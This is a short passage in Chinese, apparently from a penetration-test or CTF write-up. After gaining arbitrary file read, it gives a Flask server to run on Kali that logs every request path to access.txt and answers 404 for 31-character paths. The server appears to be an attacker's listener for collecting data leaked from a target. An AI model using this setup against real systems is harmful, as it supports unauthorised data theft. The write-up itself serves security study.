那么就可以任意读取文件了，首先在kali使用python写一个简易服务器，将所有请求都保存在access.txt里

bash
// a.py
from flask import Flask, Response, request

app = Flask(__name__)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
# catch_all 处理所有请求
def catch_all(path):
    # 获取请求的 URL 和路径
    url = request.url
    path_info = path
    
    # 将 URL 和路径保存到 access.txt
    with open('access.txt', 'a') as f:
        f.write(f"URL: {url}\n")
        f.write(f"Path: {path_info}\n")
        f.write("-" * 50 + "\n")

    # 根据路径的长度返回相应的状态码
    if len(path) == 31:
        return Response(status=404)
    else:
        return Response(status=200)

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=81)
